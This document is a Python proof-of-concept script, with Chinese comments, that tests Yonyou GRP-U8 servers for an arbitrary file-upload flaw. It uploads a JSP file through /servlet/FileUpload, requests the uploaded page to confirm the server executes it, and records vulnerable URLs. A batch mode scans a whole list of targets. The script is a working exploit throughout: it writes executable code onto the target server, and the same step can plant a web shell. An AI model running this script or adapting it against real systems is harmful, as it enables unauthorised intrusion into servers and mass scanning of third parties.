import argparse
import requests
import sys


# 漏洞检测模板
def checkVuln(url):
    vulnurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    okurl = url + "/R9iPortal/upload/1.jsp"
    data = """<% out.println("123");%>"""

    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
               'Content-Type':'multipart/form-data; boundary=---------------------------32840991842344344364451981273'}
    try:
        response = requests.get(vulnurl, headers=headers,data=data,timeout=5, verify=False)
        if response.status_code == 200:
            if '123' in requests.get(okurl,headers=headers,timeout=5,verify=False).text:
                print(f"\033[1;33;40m【+】当前网址存在漏洞：{url}" + '\033[0m')
                with open("vuln.txt","a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站不存在漏洞。")
        else:
            print("【-】目标网站不存在漏洞。")
    except Exception as e:
        print("【-】目标网址存在网络连接问题。")

# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            print(readline)
            checkVuln(readline)

def banner():
    bannerinfo = """ __   __  __   __  _______  ______    _______         __   __   _____
|  | |  ||  | |  ||       ||    _ |  |       |       |  | |  | |  _  |
|  |_|  ||  |_|  ||    ___||   | ||  |    _  | ____  |  | |  | | |_| |
|       ||       ||   | __ |   |_||_ |   |_| ||____| |  |_|  ||   _   |
|_     _||_     _||   ||  ||    __  ||    ___|       |       ||  | |  |
  |   |    |   |  |   |_| ||   |  | ||   |           |       ||  |_|  |
  |___|    |___|  |_______||___|  |_||___|           |_______||_______|"""
    print(bannerinfo)
    print("YYGRP-U8".center(100,"="))
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
    print("@zhiang225".rjust(100, " "))

# 主程序
def main():
    parser = argparse.ArgumentParser(description='YYGRP-U8-UploadFile漏洞单个检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()

if __name__ == '__main__':
    main()